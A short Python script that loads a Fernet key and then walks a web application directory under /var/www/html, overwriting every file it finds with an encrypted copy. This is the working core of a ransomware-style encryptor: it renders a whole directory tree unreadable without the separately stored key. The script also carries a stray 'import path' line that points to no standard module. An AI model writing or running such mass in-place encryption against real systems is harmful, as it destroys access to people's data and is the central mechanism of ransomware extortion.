from cryptography.fernet import Fernet
import os
import path


def write_key():
    key = Fernet.generate_key()
    with open('key.key', "wb") as key_file:
        key_file.write(key)



def load_key():
    file = open('key.key', 'rb')
    key_ = file.read()
    file.close()
    return key_


key = load_key()
fer = Fernet(key)
os.chdir(r"/var/www/html/sla/TestPython/example-app")

for root, dirs, files in os.walk('.'):
    for filename in files:
        filepath = os.path.join(root, filename)

        with open(filepath, 'rb') as f:
            data = f.read()

        with open(filepath, 'w') as f:
            f.write(fer.encrypt(data).decode())
            
print('done')